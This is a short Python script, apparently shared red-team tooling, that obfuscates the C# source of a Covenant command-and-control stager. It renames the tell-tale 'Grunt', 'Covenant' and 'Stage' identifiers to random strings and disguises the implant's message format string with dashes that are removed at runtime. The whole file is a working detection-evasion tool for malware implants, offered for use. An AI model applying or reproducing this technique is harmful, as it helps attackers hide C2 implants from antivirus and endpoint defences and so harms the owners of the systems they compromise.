#!/usr/bin/python3
# Covenant Binary stager obfuscator 
# source: https://operat-or.gitbook.io/notes/fixing-some-.net-tradecraft
# @operat_or - Jack
# 22/12/2019
#
# updated by @thelikes
# can be used for stager and executor

import argparse
import string
import random

parser = argparse.ArgumentParser(description="Covenant Binary stager obfuscator")
parser.add_argument('infile', metavar='in', type=str, help='c# file in')
parser.add_argument('outfile', metavar='out', type=str, help='obfuscated output')
args = parser.parse_args()

try:
    payload = open(args.infile).read()
    newfile = open(args.outfile, "w+")
except IOError:
    print("Input file doesn't exist or can't write to output")
    exit()
letters = string.ascii_lowercase
gruntreplace = ''.join(random.choice(letters) for i in range(5))
covenantreplace = ''.join(random.choice(letters) for i in range(5))
stagereplace = ''.join(random.choice(letters) for i in range(5))

new_stager = payload.replace("Grunt", gruntreplace)
new_stager = new_stager.replace("Covenant", covenantreplace)
new_stager = new_stager.replace("Stage", stagereplace)

msgFormatString='@"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";'
newFormatString='@"{{""---G-U-I-----D"":""{0}"",""T----y-p-----e"":{1},""---M-e-t----a"":""{2}"",""---I---V---"":""{3}"",""---E--n---cry---pt-e-d-M-e---ss---a-g-e"":""{4}"",""---H-----M--A--C"":""{5}""}}".Replace("-","");'

new_stager = new_stager.replace(msgFormatString, newFormatString)
newfile.write(new_stager)
newfile.close()
print("[+] Done")
